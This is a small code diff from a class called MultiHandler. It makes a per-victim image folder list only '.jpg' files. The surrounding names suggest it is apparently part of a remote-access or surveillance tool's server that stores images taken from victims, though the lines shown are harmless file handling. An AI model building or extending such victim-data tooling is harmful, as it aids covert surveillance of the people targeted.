@@ -414,7 +414,7 @@ class MultiHandler:
 					personal_db_image_path = "DB/" + victim_name + "/Images/"
 					if not os.path.exists(personal_db_image_path):
 						os.makedirs(personal_db_image_path)
-					images = os.listdir(personal_db_image_path)
+					images = [f for f in os.listdir(personal_db_image_path) if f.endswith('.jpg')]
 					total_images = len(images)
 					results = {}
 					results['images'] = images
